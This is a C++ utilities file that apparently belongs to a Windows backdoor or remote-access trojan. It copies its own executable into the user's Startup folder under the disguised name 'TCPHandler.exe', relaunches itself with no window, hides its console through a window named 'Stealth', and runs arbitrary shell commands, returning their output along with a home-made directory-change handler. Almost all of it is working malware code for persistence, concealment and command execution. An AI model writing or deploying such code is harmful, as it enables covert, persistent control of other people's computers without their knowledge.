#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Utils.h"
#include <string>

std::string startUpPath = std::string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TCPHandler.exe";

uint32_t getPrivateIP()
{
    char hostName[255];
    char* localIP;
    struct hostent* host_entry;

    /* return the host's name i.e "Desktop5497"*/
    gethostname(hostName, 255);
    host_entry = gethostbyname(hostName); // turn host naem to ip
    return (*(struct in_addr*)*host_entry->h_addr_list).s_addr;
}

bool isInStartUp(char* filePath)
{
    std::string fileName, startUpFileName;

    /* checking if the path of the current application running and the startup menu is the same*/
    fileName = std::string(filePath).substr(std::string(filePath).find_last_of("\\"));
    startUpFileName = startUpPath.substr(startUpPath.find_last_of("\\"));

    /* checking if the files' names are the same*/
    return fileName == startUpFileName;
}

void copyToStartUp(char* filePath)
{
    /* creating the command "copy curent <path> to <startup path>*/
    std::string command = "copy " + std::string(filePath) + " \"" + startUpPath + "\"";
    executeShell((char*)command.c_str());
}

void executeStartUpFile()
{
    // additional information
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // set the size of the structures
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    // start the program up
    if(!CreateProcessA
    (
        startUpPath.c_str(),   // the path
        NULL,                // Command line
        NULL,                   // Process handle not inheritable
        NULL,                   // Thread handle not inheritable
        FALSE,                  // Set handle inheritance to FALSE
        CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS,     // Opens file with no console
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi           // Pointer to PROCESS_INFORMATION structure
    ))
        return;

    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

std::string executeShell(char* cmd) 
{
    /* can't actually run "cd", so i created my own cd command*/
    std::string cd = std::string(cmd).substr(0, 2);
    if (cd._Equal("cd"))
        return switchDir((char*)std::string(cmd).substr(2).c_str());

    std::array<char, 128> buffer;
    std::string result;
    /*i create a pointer to a "file"*/
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);    

    /*check for errors*/
    if (!pipe)
        throw std::runtime_error("popen() failed!");
    
    /*getting the output of the command*/
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) // I read the data from the buffer 
        result += buffer.data();
   
    return result;
}

std::string switchDir(char* arg)
{
    /* get current directoy*/
    std::string subFolderPath;
    WCHAR moduleFilePath[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, moduleFilePath);

    /* change type of path*/
    char modulePath[MAX_PATH];
    wcstombs(modulePath, moduleFilePath, MAX_PATH);

    // Find the backslash in front of the name the last directory.
    std::string::size_type pos = std::string(modulePath).find_last_of("\\");

    if (!strcmp(arg, "..") || !strcmp(arg, " .."))
        // Removing the last directory
        subFolderPath = std::string(modulePath).substr(0, pos);

    else
        //adding the name of the folder
        subFolderPath = std::string(modulePath) + "\\" + &arg[1];

    WCHAR subPath[MAX_PATH];
    mbstowcs(subPath, subFolderPath.c_str(), subFolderPath.size() + 1);

    /* change the directory, in case of an error we return the error*/
    if (_wchdir(subPath))
    {
        std::cout << "Set dir error <" << GetLastError() << ">" << std::endl;
        return "can't find directory";
    }
    return subFolderPath.c_str();
}

void hideConsole()
{
    HWND Stealth;
    AllocConsole();
    /* find the console window*/
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    /* set the visiblity mode to 0, invisible*/
    ShowWindow(Stealth, 0);
}

